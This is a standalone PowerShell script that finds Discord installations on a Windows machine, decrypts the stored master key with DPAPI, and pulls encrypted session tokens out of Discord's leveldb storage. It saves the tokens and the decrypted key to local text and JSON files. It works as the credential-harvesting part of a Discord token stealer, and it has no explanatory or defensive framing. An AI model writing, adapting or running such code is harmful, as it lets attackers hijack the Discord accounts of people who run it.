$ErrorActionPreference = "Continue"

function Get-MasterKey {
    param($discord_path)
    
    try {
        $local_state = "$discord_path\Local State"
        if (!(Test-Path $local_state)) { return $null }
        
        $json = Get-Content $local_state -Raw | ConvertFrom-Json
        if (!$json.os_crypt.encrypted_key) { return $null }
        
        $encrypted_key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
        
        if ($encrypted_key.Length -gt 5) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted_key[0..4])
            if ($prefix -eq "DPAPI") {
                $encrypted_key = $encrypted_key[5..($encrypted_key.Length-1)]
            }
        }
        
        try {
            $master_key = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encrypted_key,
                $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return $master_key
        } catch {
            return $null
        }
    } catch {
        return $null
    }
}

function Find-EncryptedTokens {
    param($discord_path)
    
    $leveldb_path = "$discord_path\Local Storage\leveldb"
    if (!(Test-Path $leveldb_path)) { return @() }
    
    $tokens = @()
    $files = Get-ChildItem $leveldb_path -Include *.log,*.ldb -Recurse -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        try {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match 'dQw4w9WgXcQ:([^"]+)') {
                $tokens += $matches[1]
            }
        } catch {}
    }
    
    return $tokens
}

$paths = @(
    "$env:APPDATA\discord",
    "$env:APPDATA\discordcanary",
    "$env:APPDATA\discordptb",
    "$env:APPDATA\discorddevelopment",
    "$env:LOCALAPPDATA\discord",
    "$env:LOCALAPPDATA\DiscordCanary",
    "$env:LOCALAPPDATA\DiscordPTB",
    "$env:LOCALAPPDATA\DiscordDevelopment"
)

$discord_paths = @()
foreach ($path in $paths) {
    if (Test-Path $path) {
        $discord_paths += $path
    }
}

if ($discord_paths.Count -eq 0) { exit 1 }

$master_key = $null
$master_key_base64 = $null
$master_key_hex = $null
$all_encrypted_tokens = @()

foreach ($discord_path in $discord_paths) {
    if (!$master_key) {
        $master_key = Get-MasterKey -discord_path $discord_path
        if ($master_key) {
            $master_key_base64 = [Convert]::ToBase64String($master_key)
            $master_key_hex = [BitConverter]::ToString($master_key) -replace '-', ''
        }
    }
    
    $tokens = Find-EncryptedTokens -discord_path $discord_path
    if ($tokens) {
        $all_encrypted_tokens += $tokens
    }
}

if (!$master_key) { exit 1 }
if ($all_encrypted_tokens.Count -eq 0) { exit 1 }

$all_encrypted_tokens | Out-File -FilePath "encrypted_tokens.txt" -Encoding UTF8
$master_key_hex | Out-File -FilePath "master_key_hex.txt" -Encoding UTF8
$master_key_base64 | Out-File -FilePath "master_key_base64.txt" -Encoding UTF8

$json_data = @{
    master_key_hex = $master_key_hex
    master_key_base64 = $master_key_base64
    tokens_count = $all_encrypted_tokens.Count
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
} | ConvertTo-Json

$json_data | Out-File -FilePath "master_key.json" -Encoding UTF8
